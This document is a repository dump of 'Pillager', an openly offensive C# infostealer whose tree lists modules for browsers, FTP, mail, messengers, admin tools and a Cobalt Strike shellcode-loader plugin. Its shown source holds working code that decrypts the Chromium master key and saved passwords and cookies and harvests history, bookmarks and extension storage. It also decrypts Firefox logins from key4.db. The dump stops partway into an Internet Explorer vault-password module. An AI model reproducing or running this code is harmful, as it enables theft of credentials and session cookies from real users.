Project Path: arc_gmh5225_Pillager_tbakvv_p

Source Tree:

```txt
arc_gmh5225_Pillager_tbakvv_p
├── LICENSE
├── Pillager
│   ├── Browsers
│   │   ├── Chrome.cs
│   │   ├── FireFox.cs
│   │   ├── IE.cs
│   │   └── OldSogou.cs
│   ├── FTPs
│   │   ├── CoreFTP.cs
│   │   ├── FileZilla.cs
│   │   ├── Snowflake.cs
│   │   └── WinSCP.cs
│   ├── Helper
│   │   ├── AesGcm.cs
│   │   ├── Asn1Der.cs
│   │   ├── Bcrypt.cs
│   │   ├── Blowfish.cs
│   │   ├── LockedFile.cs
│   │   ├── Methods.cs
│   │   ├── MozillaPBE.cs
│   │   ├── Native.cs
│   │   ├── Navicat11Cipher.cs
│   │   ├── Pbkdf2.cs
│   │   ├── Pixini.cs
│   │   ├── RC4Crypt.cs
│   │   ├── SQLiteHandler.cs
│   │   ├── TripleDESHelper.cs
│   │   ├── ZipStorer.cs
│   │   ├── decryptMoz3DES.cs
│   │   └── models.cs
│   ├── Mails
│   │   ├── Foxmail.cs
│   │   ├── MailBird.cs
│   │   ├── MailMaster.cs
│   │   └── Outlook.cs
│   ├── Messengers
│   │   ├── DingTalk.cs
│   │   ├── Discord.cs
│   │   ├── Enigma.cs
│   │   ├── Line.cs
│   │   ├── QQ.cs
│   │   ├── Skype.cs
│   │   └── Telegram.cs
│   ├── Pillager.csproj
│   ├── Program.cs
│   ├── Properties
│   │   └── AssemblyInfo.cs
│   ├── Softwares
│   │   ├── NeteaseCloudMusic.cs
│   │   └── VSCode.cs
│   ├── SystemInfos
│   │   ├── InstalledApp.cs
│   │   ├── ScreenShot.cs
│   │   └── Wifi.cs
│   ├── Tools
│   │   ├── DBeaver.cs
│   │   ├── FinalShell.cs
│   │   ├── MobaXterm.cs
│   │   ├── Navicat.cs
│   │   ├── RDCMan.cs
│   │   ├── SQLyog.cs
│   │   ├── SecureCRT.cs
│   │   ├── TortoiseSVN.cs
│   │   └── Xmanager.cs
│   └── app.config
├── Pillager.png
├── Pillager.sln
├── README.md
├── README_ZH.md
└── cs-plugin
    ├── browser.cna
    └── module
        ├── scloader.c
        ├── scloader.x64.o
        └── scloader.x86.o

```

`LICENSE`:

```
MIT License

Copyright (c) 2023 qwqdanchun

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`Pillager.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.5.33516.290
MinimumVisualStudioVersion = 10.0.40219.1
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "Pillager", "Pillager\Pillager.csproj", "{2DFB5BEA-C5B3-4639-8D37-B6149D665ECA}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|Any CPU = Debug|Any CPU
		Release|Any CPU = Release|Any CPU
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{2DFB5BEA-C5B3-4639-8D37-B6149D665ECA}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{2DFB5BEA-C5B3-4639-8D37-B6149D665ECA}.Debug|Any CPU.Build.0 = Debug|Any CPU
		{2DFB5BEA-C5B3-4639-8D37-B6149D665ECA}.Release|Any CPU.ActiveCfg = Release|Any CPU
		{2DFB5BEA-C5B3-4639-8D37-B6149D665ECA}.Release|Any CPU.Build.0 = Release|Any CPU
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {1D2766E9-71B8-476C-9F0C-64BE1BADC1C1}
	EndGlobalSection
EndGlobal

```

`Pillager/Browsers/Chrome.cs`:

```cs
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Pillager.Helper;

namespace Pillager.Browsers
{
    public static class Chrome
    {
        public static string BrowserPath { get; set; }

        public static string BrowserName { get; set; }

        public static byte[] MasterKey { get; set; }

        private static string[] profiles { get; set; }

        public static Dictionary<string, string> browserOnChromium = new Dictionary<string, string>
        {
            { "Chrome", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Google\\Chrome\\User Data" )} ,
            { "Chrome Beta",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google\\Chrome Beta\\User Data" )},
            { "Chromium", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Chromium\\User Data" )} ,
            { "Chrome SxS", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Google\\Chrome SxS\\User Data" )},
            { "Edge", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Microsoft\\Edge\\User Data") } ,
            { "Brave-Browser", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"BraveSoftware\\Brave-Browser\\User Data") } ,
            { "QQBrowser",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Tencent\\QQBrowser\\User Data") } ,
            { "SogouExplorer", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Sogou\\SogouExplorer\\User Data") } ,
            { "360ChromeX", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"360ChromeX\\Chrome\\User Data" )} ,
            { "360Chrome",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "360Chrome\\Chrome\\User Data") } ,
            { "Vivaldi",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Vivaldi\\User Data") } ,
            { "CocCoc", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"CocCoc\\Browser\\User Data" )},
            { "Torch", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Torch\\User Data" )},
            { "Kometa", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Kometa\\User Data" )},
            { "Orbitum", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Orbitum\\User Data" )},
            { "CentBrowser",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "CentBrowser\\User Data" )},
            { "7Star", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"7Star\\7Star\\User Data" )},
            { "Sputnik", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Sputnik\\Sputnik\\User Data" )},
            { "Epic Privacy Browser", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Epic Privacy Browser\\User Data" )},
            { "Uran",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "uCozMedia\\Uran\\User Data" )},
            { "Yandex", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Yandex\\YandexBrowser\\User Data" )},
            { "Iridium", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),"Iridium\\User Data" )},
            { "Opera", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),"Opera Software\\Opera Stable" )},
            { "Opera GX", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),"Opera Software\\Opera GX Stable" )},
        };


        public static byte[] GetMasterKey()
        {
            string filePath = Path.Combine(BrowserPath, "Local State");
            byte[] masterKey = new byte[] { };
            if (!File.Exists(filePath))
                return null;
            var pattern = new System.Text.RegularExpressions.Regex("\"encrypted_key\":\"(.*?)\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath).Replace(" ", ""));
            foreach (System.Text.RegularExpressions.Match prof in pattern)
            {
                if (prof.Success)
                    masterKey = Convert.FromBase64String((prof.Groups[1].Value));
            }
            byte[] temp = new byte[masterKey.Length - 5];
            Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5);
            try
            {
                return ProtectedData.Unprotect(temp, null, DataProtectionScope.CurrentUser);
            }
            catch
            {
                return null;
            }
        }

        private static byte[] DecryptData(byte[] buffer)
        {
            byte[] decryptedData = null;
            if (MasterKey is null) return null;
            try
            {
                string bufferString = Encoding.Default.GetString(buffer);
                if (bufferString.StartsWith("v10") || bufferString.StartsWith("v11"))
                {
                    byte[] iv = new byte[12];
                    Array.Copy(buffer, 3, iv, 0, 12);
                    byte[] cipherText = new byte[buffer.Length - 15];
                    Array.Copy(buffer, 15, cipherText, 0, buffer.Length - 15);
                    byte[] tag = new byte[16];
                    Array.Copy(cipherText, cipherText.Length - 16, tag, 0, 16);
                    byte[] data = new byte[cipherText.Length - tag.Length];
                    Array.Copy(cipherText, 0, data, 0, cipherText.Length - tag.Length);
                    decryptedData = new AesGcm().Decrypt(MasterKey, iv, null, data, tag);
                }
                else
                {
                    decryptedData = ProtectedData.Unprotect(buffer, null, DataProtectionScope.CurrentUser);
                }
            }
            catch { }
            return decryptedData;
        }

        public static string Chrome_passwords()
        {
            StringBuilder passwords = new StringBuilder();
            foreach (var profile in profiles)
            {
                string loginDataPath = Path.Combine(BrowserPath, profile + "\\Login Data");
                if (!File.Exists(loginDataPath))
                    continue;
                try
                {
                    string tempLoginDataPath = Path.GetTempFileName();
                    File.Copy(loginDataPath, tempLoginDataPath, true);
                    SQLiteHandler handler = new SQLiteHandler(tempLoginDataPath);
                    if (!handler.ReadTable("logins"))
                        continue;
                    for (int i = 0; i < handler.GetRowCount(); i++)
                    {
                        string url = handler.GetValue(i, "origin_url");
                        string username = handler.GetValue(i, "username_value");
                        string crypt = handler.GetValue(i, "password_value");
                        string password = Encoding.UTF8.GetString(DecryptData(Convert.FromBase64String(crypt)));
                        if (!string.IsNullOrEmpty(url) && !string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(password))
                        {
                            passwords.Append("\t[URL] -> {" + url + "}\n\t[USERNAME] -> {" + username + "}\n\t[PASSWORD] -> {" + password + "}\n");
                            passwords.AppendLine();
                        }
                    }
                    File.Delete(tempLoginDataPath);
                }
                catch { }
            }
            return passwords.ToString();
        }

        public static string Chrome_history()
        {
            StringBuilder history = new StringBuilder();
            foreach (var profile in profiles)
            {
                string chrome_History_path = BrowserName.Contains("360") ? Path.Combine(BrowserPath, profile + "\\360History") : Path.Combine(BrowserPath, profile + "\\History");
                if (!File.Exists(chrome_History_path))
                    continue;
                try
                {
                    string history_tempFile = Path.GetTempFileName();
                    File.Copy(chrome_History_path, history_tempFile, true);
                    SQLiteHandler handler = new SQLiteHandler(history_tempFile);
                    if (!handler.ReadTable("urls"))
                        continue;
                    for (int i = 0; i < handler.GetRowCount(); i++)
                    {
                        string url = handler.GetValue(i, "url");
                        history.AppendLine(url);
                    }
                    File.Delete(history_tempFile);
                }
                catch { }
            }
            return history.ToString();
        }

        public static string Chrome_cookies()
        {
            StringBuilder cookies = new StringBuilder();
            foreach (var profile in profiles)
            {
                string chrome_cookie_path = Path.Combine(BrowserPath, profile + "\\Cookies");
                string chrome_100plus_cookie_path = Path.Combine(BrowserPath, profile + "\\Network\\Cookies");
                if (!File.Exists(chrome_cookie_path))
                    chrome_cookie_path = chrome_100plus_cookie_path;
                if (!File.Exists(chrome_cookie_path))
                    continue;
                try
                {
                    string cookie_tempFile = Path.GetTempFileName();
                    try
                    {
                        File.Copy(chrome_cookie_path, cookie_tempFile, true);
                    }
                    catch
                    {
                        byte[] ckfile = LockedFile.ReadLockedFile(chrome_cookie_path);
                        if (ckfile != null)
                        {
                            File.WriteAllBytes(cookie_tempFile, ckfile);
                        }
                    }
                    SQLiteHandler handler = new SQLiteHandler(cookie_tempFile);
                    if (!handler.ReadTable("cookies"))
                        continue;
                    for (int i = 0; i < handler.GetRowCount(); i++)
                    {
                        try
                        {
                            string host_key = handler.GetValue(i, "host_key");
                            string name = handler.GetValue(i, "name");
                            string crypt = handler.GetValue(i, "encrypted_value");
                            string path = handler.GetValue(i, "path");
                            double expDateDouble = 0;
                            long.TryParse(handler.GetValue(i, "expires_utc"), out var expDate);
                            if ((expDate / 1000000.000000000000) - 11644473600 > 0)
                                expDateDouble = (expDate / 1000000.000000000000000) - 11644473600;
                            string cookie = Encoding.UTF8.GetString(DecryptData(Convert.FromBase64String(crypt)));
                            cookies.AppendLine("{");
                            cookies.AppendLine("    \"domain\": \"" + host_key + "\",");
                            cookies.AppendLine("    \"expirationDate\": " + expDateDouble + ",");
                            cookies.AppendLine("    \"hostOnly\": false,");
                            cookies.AppendLine("    \"name\": \"" + name + "\",");
                            cookies.AppendLine("    \"path\": \"" + path + "\",");
                            cookies.AppendLine("    \"session\": true,");
                            cookies.AppendLine("    \"storeId\": null,");
                            cookies.AppendLine("    \"value\": \"" + cookie.Replace("\"", "\\\"") + "\"");
                            cookies.AppendLine("},");
                        }
                        catch { }
                    }
                    File.Delete(cookie_tempFile);
                }
                catch { }
            }
            if (cookies.Length > 0)
            {
                string temp = cookies.ToString();
                return "[" + temp.Substring(0, temp.Length - 3) + "]";
            }
            return cookies.ToString();
        }

        public static string Chrome_books()
        {
            StringBuilder stringBuilder = new StringBuilder();
            foreach (var profile in profiles)
            {
                string chrome_book_path = BrowserName.Contains("360") ? Path.Combine(BrowserPath, profile + "\\360Bookmarks") : Path.Combine(BrowserPath, profile + "\\Bookmarks");
                if (File.Exists(chrome_book_path))
                {
                    stringBuilder.Append(File.ReadAllText(chrome_book_path));
                }
            }
            return stringBuilder.ToString();
        }

        public static string Chrome_extensions()
        {
            StringBuilder stringBuilder = new StringBuilder();
            foreach (var profile in profiles)
            {
                string chrome_extension_path = Path.Combine(BrowserPath, profile + "\\Extensions");
                if (Directory.Exists(chrome_extension_path))
                {
                    foreach (string item in Directory.GetDirectories(chrome_extension_path))
                    {
                        try
                        {
                            string manifest = Path.Combine(Directory.GetDirectories(item)[0], "manifest.json");
                            var pattern = new System.Text.RegularExpressions.Regex("\"name\": \"(.*?)\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(manifest));
                            foreach (System.Text.RegularExpressions.Match prof in pattern)
                            {
                                if (prof.Success)
                                {
                                    string id = Path.GetFileName(item);
                                    string name = prof.Groups[1].Value;
                                    stringBuilder.AppendLine(id + "    " + name);
                                }
                            }
                        }
                        catch
                        { }
                    }
                }
            }
            return stringBuilder.ToString();
        }

        public static void Save(string path)
        {
            foreach (var browser in browserOnChromium)
            {
                try
                {
                    string chromepath = browser.Value;
                    BrowserName = browser.Key;
                    BrowserPath = chromepath;
                    MasterKey = GetMasterKey();
                    if (MasterKey == null) continue;
                    List<string> profileslist = new List<string>
                    {
                        "Default"
                    };
                    List<string> dirs = Directory.GetDirectories(BrowserPath).ToList();
                    for (int i = 1; i < 100; i++)
                    {
                        if (dirs.Contains(Path.Combine(BrowserPath, "Profile " + i)))
                        {
                            profileslist.Add("Profile " + i);
                        }
                    }
                    profiles = profileslist.ToArray();
                    string savepath = Path.Combine(path, BrowserName);
                    Directory.CreateDirectory(savepath);
                    string cookies = Chrome_cookies();
                    string passwords = Chrome_passwords();
                    string books = Chrome_books();
                    string history = Chrome_history();
                    string extension = Chrome_extensions();
                    if (!string.IsNullOrEmpty(cookies)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_cookies.txt"), cookies);
                    if (!string.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
                    if (!string.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
                    if (!string.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
                    if (!string.IsNullOrEmpty(extension)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_extension.txt"), extension);
                    foreach (var profile in profiles)
                    {
                        Directory.CreateDirectory(Path.Combine(BrowserPath, profile));
                        if (Directory.Exists(Path.Combine(BrowserPath, profile + "\\Local Storage"))) Methods.CopyDirectory(Path.Combine(BrowserPath, profile + "\\Local Storage"), Path.Combine(savepath, profile + "\\Local Storage"), true);
                        if (Directory.Exists(Path.Combine(BrowserPath, profile + "\\Local Extension Settings"))) Methods.CopyDirectory(Path.Combine(BrowserPath, profile + "\\Local Extension Settings"), Path.Combine(savepath, profile + "\\Local Extension Settings"), true);
                        if (Directory.Exists(Path.Combine(BrowserPath, profile + "\\Sync Extension Settings"))) Methods.CopyDirectory(Path.Combine(BrowserPath, profile + "\\Sync Extension Settings"), Path.Combine(savepath, profile + "\\Sync Extension Settings"), true);
                        if (Directory.GetDirectories(Path.Combine(BrowserPath, profile)).Length == 0) Directory.Delete(Path.Combine(BrowserPath, profile));
                    }
                }
                catch { }
            }
        }
    }
}

```

`Pillager/Browsers/FireFox.cs`:

```cs
using Pillager.Helper;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

namespace Pillager.Browsers
{
    internal static class FireFox
    {
        public static string BrowserName = "FireFox";

        public static string BrowserPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Mozilla\\Firefox\\Profiles");

        public static string masterPassword = "";

        public static string FireFox_cookies()
        {
            StringBuilder cookies = new StringBuilder();
            foreach (var directory in Directory.GetDirectories(BrowserPath))
            {
                string firefox_cookie_path = Path.Combine(directory, "cookies.sqlite");
                if (File.Exists(firefox_cookie_path))
                {
                    try
                    {
                        string cookie_tempFile = Path.GetTempFileName();
                        File.Copy(firefox_cookie_path, cookie_tempFile, true);
                        SQLiteHandler handler = new SQLiteHandler(cookie_tempFile);
                        if (!handler.ReadTable("moz_cookies"))
                            return null;
                        for (int i = 0; i < handler.GetRowCount(); i++)
                        {
                            string host_key = handler.GetValue(i, "host");
                            string name = handler.GetValue(i, "name");
                            string cookie = handler.GetValue(i, "value");
                            cookies.AppendLine("[" + host_key + "] \t {" + name + "}={" + cookie + "}");
                        }
                        File.Delete(cookie_tempFile);
                    }
                    catch { }
                }
            }            

            return cookies.ToString();
        }

        public static string FireFox_history()
        {
            StringBuilder history = new StringBuilder();
            foreach (var directory in Directory.GetDirectories(BrowserPath))
            {
                string firefox_history_path = Path.Combine(directory, "places.sqlite");
                if (File.Exists(firefox_history_path))
                {
                    try
                    {
                        string history_tempFile = Path.GetTempFileName();
                        File.Copy(firefox_history_path, history_tempFile, true);
                        SQLiteHandler handler = new SQLiteHandler(history_tempFile);
                        if (!handler.ReadTable("moz_places")) return null;
                        for (int i = 0; i < handler.GetRowCount(); i++)
                        {
                            string url = handler.GetValue(i, "url");
                            history.AppendLine(url);
                        }
                        File.Delete(history_tempFile);
                    }
                    catch { }
                }
            }
            
            return history.ToString();
        }

        public static string FireFox_books()
        {
            StringBuilder books = new StringBuilder();
            foreach (var directory in Directory.GetDirectories(BrowserPath))
            {
                string firefox_books_path = Path.Combine(directory, "places.sqlite");
                if (File.Exists(firefox_books_path))
                {
                    try
                    {
                        string books_tempFile = Path.GetTempFileName();
                        File.Copy(firefox_books_path, books_tempFile, true);
                        SQLiteHandler handler = new SQLiteHandler(books_tempFile);
                        if (!handler.ReadTable("moz_bookmarks")) return null;
                        List<string> fks = new List<string>();
                        for (int i = 0; i < handler.GetRowCount(); i++)
                        {
                            var fk = handler.GetValue(i, "fk");
                            if (fk != "0")
                            {
                                fks.Add(fk);
                            }
                        }
                        handler = new SQLiteHandler(books_tempFile);
                        if (!handler.ReadTable("moz_places")) return null;
                        for (int i = 0; i < handler.GetRowCount(); i++)
                        {
                            var id = handler.GetRawID(i);
                            if (fks.Contains(id.ToString()))
                            {
                                books.AppendLine(handler.GetValue(i, "url"));
                            }
                        }
                        File.Delete(books_tempFile);
                    }
                    catch { }
                }
            }
            
            return books.ToString();
        }

        public static string FireFox_passwords()
        {
            StringBuilder password = new StringBuilder();
            foreach (var directory in Directory.GetDirectories(BrowserPath))
            {
                string loginsJsonPath = Path.Combine(directory, "logins.json");
                string keyDBPath = Path.Combine(directory, "key4.db");
                if (File.Exists(loginsJsonPath) && File.Exists(keyDBPath))
                {
                    try
                    {
                        string password_keyDB_tempFile = Path.GetTempFileName();
                        File.Copy(keyDBPath, password_keyDB_tempFile, true);
                        string password_loginsJson_tempFile = Path.GetTempFileName();
                        File.Copy(loginsJsonPath, password_loginsJson_tempFile, true);
                        SQLiteHandler handler = new SQLiteHandler(password_keyDB_tempFile);
                        if (!handler.ReadTable("metadata")) return null;
                        Asn1Der asn = new Asn1Der();
                        for (int i = 0; i < handler.GetRowCount(); i++)
                        {
                            if (handler.GetValue(i, "id") != "password") continue;
                            byte[] item2Byte;
                            var globalSalt = Convert.FromBase64String(handler.GetValue(i, "item1"));
                            try
                            {
                                item2Byte = Convert.FromBase64String(handler.GetValue(i, "item2"));
                            }
                            catch
                            {
                                item2Byte = Convert.FromBase64String(handler.GetValue(i, "item2)"));
                            }
                            Asn1DerObject item2 = asn.Parse(item2Byte);
                            string asnString = item2.ToString();
                            if (asnString.Contains("2A864886F70D010C050103"))
                            {
                                var entrySalt = item2.objects[0].objects[0].objects[1].objects[0].Data;
                                var cipherText = item2.objects[0].objects[1].Data;
                                decryptMoz3DES CheckPwd = new decryptMoz3DES(cipherText, globalSalt, Encoding.ASCII.GetBytes(masterPassword), entrySalt);
                                var passwordCheck = CheckPwd.Compute();
                                string decryptedPwdChk = Encoding.GetEncoding("ISO-8859-1").GetString(passwordCheck);
                                if (!decryptedPwdChk.StartsWith("password-check")) return null;
                            }
                            else if (asnString.Contains("2A864886F70D01050D"))
                            {
                                var entrySalt = item2.objects[0].objects[0].objects[1].objects[0].objects[1].objects[0].Data;
                                var partIV = item2.objects[0].objects[0].objects[1].objects[2].objects[1].Data;
                                var cipherText = item2.objects[0].objects[0].objects[1].objects[3].Data;
                                MozillaPBE CheckPwd = new MozillaPBE(cipherText, globalSalt, Encoding.ASCII.GetBytes(masterPassword), entrySalt, partIV);
                                var passwordCheck = CheckPwd.Compute();
                                string decryptedPwdChk = Encoding.GetEncoding("ISO-8859-1").GetString(passwordCheck);
                                if (!decryptedPwdChk.StartsWith("password-check")) return null;
                            }
                            else return null;
                            try
                            {
                                handler = new SQLiteHandler(password_keyDB_tempFile);
                                if (!handler.ReadTable("nssPrivate")) return null;
                                for (int j = 0; j < handler.GetRowCount(); j++)
                                {
                                    var a11Byte = Convert.FromBase64String(handler.GetValue(j, "a11"));
                                    Asn1DerObject a11ASNValue = asn.Parse(a11Byte);
                                    var keyEntrySalt = a11ASNValue.objects[0].objects[0].objects[1].objects[0].objects[1].objects[0].Data;
                                    var keyPartIV = a11ASNValue.objects[0].objects[0].objects[1].objects[2].objects[1].Data;
                                    var keyCipherText = a11ASNValue.objects[0].objects[0].objects[1].objects[3].Data;
                                    MozillaPBE PrivKey = new MozillaPBE(keyCipherText, globalSalt, Encoding.ASCII.GetBytes(masterPassword), keyEntrySalt, keyPartIV);
                                    var fullprivateKey = PrivKey.Compute();
                                    byte[] privateKey = new byte[24];
                                    Array.Copy(fullprivateKey, privateKey, privateKey.Length);
                                    password.Append(decryptLogins(loginsJsonPath, privateKey));
                                }
                            }
                            catch { }
                        }
                        File.Delete(password_keyDB_tempFile);
                        File.Delete(password_loginsJson_tempFile);
                    }
                    catch { }
                }
            }
            
            return password.ToString();
        }

        public static string decryptLogins(string loginsJsonPath, byte[] privateKey)
        {
            StringBuilder sb = new StringBuilder();
            Asn1Der asn = new Asn1Der();
            Login[] logins = ParseLoginFile(loginsJsonPath);
            if (logins.Length == 0) return null;
            foreach (Login login in logins)
            {
                Asn1DerObject user = asn.Parse(Convert.FromBase64String(login.encryptedUsername));
                Asn1DerObject pwd = asn.Parse(Convert.FromBase64String(login.encryptedPassword));
                string hostname = login.hostname;
                string decryptedUser = TripleDESHelper.DESCBCDecryptor(privateKey, user.objects[0].objects[1].objects[1].Data, user.objects[0].objects[2].Data);
                string decryptedPwd = TripleDESHelper.DESCBCDecryptor(privateKey, pwd.objects[0].objects[1].objects[1].Data, pwd.objects[0].objects[2].Data);
                sb.Append("\t[URL] -> {" + hostname + "}\n\t[USERNAME] -> {" + Regex.Replace(decryptedUser, @"[^\u0020-\u007F]", "") + "}\n\t[PASSWORD] -> {" + Regex.Replace(decryptedPwd, @"[^\u0020-\u007F]", "") + "}\n");
                sb.AppendLine();
            }
            return sb.ToString();
        }

        public static Login[] ParseLoginFile(string path)
        {
            string rawText = File.ReadAllText(path);
            int openBracketIndex = rawText.IndexOf('[');
            int closeBracketIndex = rawText.IndexOf("],");
            string loginArrayText = rawText.Substring(openBracketIndex + 1, closeBracketIndex - (openBracketIndex + 1));
            return ParseLoginItems(loginArrayText);
        }

        public static Login[] ParseLoginItems(string loginJSON)
        {
            int openBracketIndex = loginJSON.IndexOf('{');
            List<Login> logins = new List<Login>();
            string[] intParams = new string[] { "id", "encType", "timesUsed" };
            string[] longParams = new string[] { "timeCreated", "timeLastUsed", "timePasswordChanged" };
            while (openBracketIndex != -1)
            {
                int encTypeIndex = loginJSON.IndexOf("encType", openBracketIndex);
                int closeBracketIndex = loginJSON.IndexOf('}', encTypeIndex);
                Login login = new Login();
                string bracketContent = "";
                for (int i = openBracketIndex + 1; i < closeBracketIndex; i++)
                {
                    bracketContent += loginJSON[i];
                }
                bracketContent = bracketContent.Replace("\"", "");
                string[] keyValuePairs = bracketContent.Split(',');
                foreach (string keyValueStr in keyValuePairs)
                {
                    string[] keyValue = keyValueStr.Split(new[] { ':' }, 2);
                    string key = keyValue[0];
                    string val = keyValue[1];
                    if (val == "null")
                    {
                        login.GetType().GetProperty(key).SetValue(login, null, null);
                    }
                    if (Array.IndexOf(intParams, key) > -1)
                    {
                        login.GetType().GetProperty(key).SetValue(login, int.Parse(val), null);
                    }
                    else if (Array.IndexOf(longParams, key) > -1)
                    {
                        login.GetType().GetProperty(key).SetValue(login, long.Parse(val), null);
                    }
                    else
                    {
                        login.GetType().GetProperty(key).SetValue(login, val, null);
                    }
                }
                logins.Add(login);
                openBracketIndex = loginJSON.IndexOf('{', closeBracketIndex);
            }
            return logins.ToArray();
        }
        public static void Save(string path)
        {
            try
            {
                if (!Directory.Exists(BrowserPath)) return;
                string savepath = Path.Combine(path, BrowserName);
                Directory.CreateDirectory(savepath);
                string cookies = FireFox_cookies();
                string history = FireFox_history();
                string books = FireFox_books();
                string passwords = FireFox_passwords();
                if (!String.IsNullOrEmpty(cookies)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_cookies.txt"), cookies);
                if (!String.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
                if (!String.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
                if (!String.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
                foreach (var directory in Directory.GetDirectories(BrowserPath))
                {
                    if (File.Exists(Path.Combine(directory, "storage-sync-v2.sqlite")))
                    {
                        File.Copy(Path.Combine(directory, "storage-sync-v2.sqlite"), Path.Combine(savepath, "storage-sync-v2.sqlite"));
                        if (File.Exists(Path.Combine(directory, "storage-sync-v2.sqlite-shm")))
                            File.Copy(Path.Combine(directory, "storage-sync-v2.sqlite-shm"), Path.Combine(savepath, "storage-sync-v2.sqlite-shm"));
                        if (File.Exists(Path.Combine(directory, "storage-sync-v2.sqlite-wal")))
                            File.Copy(Path.Combine(directory, "storage-sync-v2.sqlite-wal"), Path.Combine(savepath, "storage-sync-v2.sqlite-wal"));
                        break;
                    }
                }
            }
            catch { }
        }
    }
}

```

`Pillager/Browsers/IE.cs`:

```cs
using Microsoft.Win32;
using Pillager.Helper;
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace Pillager.Browsers
{
    public static class IE
    {
        public static string BrowserName = "IE";

        [DllImport("kernel32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);

        [DllImport("kernel32")]
        public static extern IntPtr GetCurrentProcess();

        public static string IE_passwords()
        {
            if (IntPtr.Size == 4)
            {
                IsWow64Process(GetCurrentProcess(), out var is64Bit);
                if (is64Bit)
                {
                    return "Don't support recovery IE password from wow64 process";
                }
            }
            StringBuilder sb = new StringBuilder();
            var OSVersion = Environment.OSVersion.Version;
            var OSMajor = OSVersion.Major;
            var OSMinor = OSVersion.Minor;

            Type VAULT_ITEM;

            if (OSMajor >= 6 && OSMinor >= 2)
            {
                VAULT_ITEM = typeof(Native.VAULT_ITEM_WIN8);
            }
            else
            {
                VAULT_ITEM = typeof(Native.VAULT_ITEM_WIN7);
            }

            /* Helper function to extract the ItemValue field from a VAULT_ITEM_ELEMENT struct */
            object GetVaultElementValue(IntPtr vaultElementPtr)
            {
